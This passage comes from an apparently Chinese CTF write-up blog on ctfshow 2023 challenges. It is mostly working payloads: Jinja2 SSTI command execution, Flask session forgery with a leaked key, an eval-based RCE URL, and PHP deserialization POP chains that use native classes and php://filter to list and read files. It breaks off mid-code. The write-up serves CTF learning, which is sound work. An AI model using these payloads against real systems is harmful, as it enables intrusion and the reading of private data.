-d`&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>最后使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;`echo Y2F0IC9mbGFn | base64 -d`&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>拿到flag</p><h1 id="2023愚人杯easy-flask"><a href="#2023愚人杯easy-flask" class="headerlink" title="2023愚人杯easy-flask"></a>2023愚人杯easy-flask</h1><p>进入看见登录框尝试sql，xss，ssti没结果</p><p>发现admin账号提示密码错误，注册账号进去看看</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122150714144.png" alt="1"></p><p>提示我们是user，再learn看见密码是S3cr3tK3y</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122150747281.png" alt="image-20250122150747281"></p><p>爆破session,拿到</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;<span class="hljs-string">&#x27;loggedin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br>-&gt; &#123;<span class="hljs-string">&#x27;loggedin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>修改为admin用密钥加密,替换元素session</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiIxIn0<span class="hljs-selector-class">.Z5CcCA</span>.IZ_i9nESqDbObpSXrK72b8-VfZ8<br></code></pre></td></tr></table></figure><p>伪造成功看见一个下载</p><p>​<img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122152102290.png" alt="image-20250122152102290"></p><p>但是下载是一些没用的faskflag</p><p>抓包发现存在任意文件下载，下载源码看看&#x2F;app&#x2F;app.py绝对路径</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122152504059.png" alt="image-20250122152504059"></p><p>发现hello目录存在rce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/hello?<span class="hljs-built_in">eval</span>=__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /flag_is_h3re &#x27;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p>导入os库拿到flag</p><h1 id="2023愚人杯easy-php"><a href="#2023愚人杯easy-php" class="headerlink" title="2023愚人杯easy-php"></a>2023愚人杯easy-php</h1><p>pop链，链子很简单，但是不能用O，a开头也就是不能用数组绕过</p><p>查了下资料，要用实现了<code>Serializable</code> 接口的原生类来构造</p><p>查找实现了serializable接口的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$classes</span> = <span class="hljs-title function_ invoke__">get_declared_classes</span>();<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;<br><br>    <span class="hljs-variable">$methods</span> = <span class="hljs-title function_ invoke__">get_class_methods</span>(<span class="hljs-variable">$class</span>);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(<br><br>            <span class="hljs-string">&#x27;unserialize&#x27;</span>,<br><br>        ))) &#123;<br><br>            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>        &#125;<br><br>    &#125;&#125;<br></code></pre></td></tr></table></figure><p>虽然在低版本的时候可以在Oa后面加+绕过但是这里不行，版本应该在7.4+</p><p>所有payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ctfshow;<br><span class="hljs-variable">$a</span>-&gt;ctfshow=<span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;evil&quot;</span>=&gt;<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$oa</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$oa</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br><span class="hljs-meta">?&gt;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>注意：不要再phpstorm运行代码，不然会以O开头在本地原始环境运行</p></blockquote><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">C:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ArrayObject&quot;</span>:<span class="hljs-number">78</span>:&#123;x:i:<span class="hljs-number">0</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;cat /f*&quot;</span>;&#125;&#125;;m:a:<span class="hljs-number">0</span>:&#123;&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="解释为什么不会触发-wakeup"><a href="#解释为什么不会触发-wakeup" class="headerlink" title="解释为什么不会触发__wakeup()"></a>解释为什么不会触发__wakeup()</h2><p>O标识符代表对象类型，而C标识符代表类名类型。如果将C替换为O，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。这样一来，在反序列化时，__wakeup魔术方法就不会触发，简单来说就是wakeup只对对象有效</p><h1 id="2023愚人杯被遗忘的反序列化"><a href="#2023愚人杯被遗忘的反序列化" class="headerlink" title="2023愚人杯被遗忘的反序列化"></a>2023愚人杯被遗忘的反序列化</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># 当前目录中有一个txt文件哦</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;check.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;text == <span class="hljs-string">&quot;aaaa&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">lcfirst</span>(<span class="hljs-variable">$this</span>-&gt;text);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$kk</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> cycycycy;<br>        <span class="hljs-variable">$a</span> -&gt; <span class="hljs-title function_ invoke__">aaa</span>();<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaa</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get&#x27;</span>];<br>        <span class="hljs-variable">$get</span> = <span class="hljs-title function_ invoke__">cipher</span>(<span class="hljs-variable">$get</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$get</span> === <span class="hljs-string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;eval&quot;</span>]);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a_a</span> = <span class="hljs-variable language_">$this</span> -&gt; a;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a_a\$&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;   <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="hljs-variable">$this</span> -&gt; key))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span> -&gt; file);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;不行哦&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;aaa;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; aaa = <span class="hljs-keyword">clone</span> <span class="hljs-keyword">new</span> EeE;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$_ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_AAAAAA&quot;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_ip</span>);<br></code></pre></td></tr></table></figure><p>首先是通过header头传参的 比较新奇</p><p>好多函数没定义肯定先要读.txt文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类中coos和file都可控，那么就可以利用php原生类来读取文件</p><h2 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a><strong>GlobIterator</strong></h2><p>GlobIterator 类也可以遍历一个文件目录，但与上面略不同的是其行为类似于 <a href="https://so.csdn.net/so/search?q=glob&spm=1001.2101.3001.7020">glob</a>()，可以通过模式匹配来寻找文件路径。</p><p>它的特点就是，只需要知道部分名称就可以进行遍历</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;*txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;GlobIterator&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>拿到文件名加<code>h1nt.txt</code></p><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p>拿到文件名那我们直接使用SplFileObject原生类直接读</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;h1nt.txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>但是只有</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122162120344.png" alt="image-20250122162120344"></p><p>应该是注释掉了，使用伪协议读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>解码后得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#用于check.php</span><br><br><span class="hljs-attribute">key</span>：qwertyuiopasdfghjklzxcvbnm123456789<br><br><span class="hljs-attribute">move</span>：<span class="hljs-number">2</span>~<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>但是不知道有什么用</p><p>尝试使用原生类扫目录试试</p><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h2><p><code>glob:///f*</code>，这是一个 PHP 的流包装器，用于匹配根目录下的所有f开头的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;glob:///f*&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;DirectoryIterator&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>找到flag的文件是f1agaaa</p><p>使用伪协议读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=f1agaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span 